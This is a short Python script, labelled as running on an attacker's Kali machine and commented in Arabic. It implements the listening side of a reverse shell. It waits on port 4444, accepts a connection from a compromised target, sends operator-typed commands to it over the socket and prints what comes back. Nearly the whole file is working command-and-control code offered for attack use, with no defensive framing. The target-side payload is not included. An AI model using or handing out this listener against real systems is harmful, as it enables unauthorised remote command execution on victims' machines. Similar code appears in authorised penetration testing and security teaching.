# Listener.py - Attacker's Machine (Kali)
import socket

# -- إعدادات المستمع --
HOST = '0.0.0.0'  # اجعله يستمع على كل الواجهات المتاحة
PORT = 4444       # المنفذ الذي سيتم الاستماع عليه

# إنشاء سوكيت TCP/IP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# ربط السوكيت بالمنفذ
s.bind((HOST, PORT))

# بدء الاستماع للاتصالات الواردة (يستطيع التعامل مع اتصال واحد فقط)
s.listen(1)

print(f"[*] Listening on {HOST}:{PORT}")

# قبول الاتصال عند حدوثه
conn, addr = s.accept()
print(f"[+] Connected by {addr[0]}:{addr[1]}")

# حلقة لا نهائية لتلقي الأوامر وإرسال النتائج
while True:
    try:
        # إدخال الأمر من المهاجم
        command = input("Shell> ")
        
        if command.lower() == 'exit':
            conn.send(command.encode('utf-8'))
            break

        # إرسال الأمر إلى الهدف
        conn.send(command.encode('utf-8'))

        # استقبال نتيجة الأمر من الهدف (بحد أقصى 4096 بايت)
        result = conn.recv(4096).decode('utf-8', 'ignore')

        # طباعة النتيجة
        print(result)
    except Exception as e:
        print(f"[-] Error: {e}")
        break

# إغلاق الاتصال
print("[-] Connection closed.")
conn.close()
s.close()
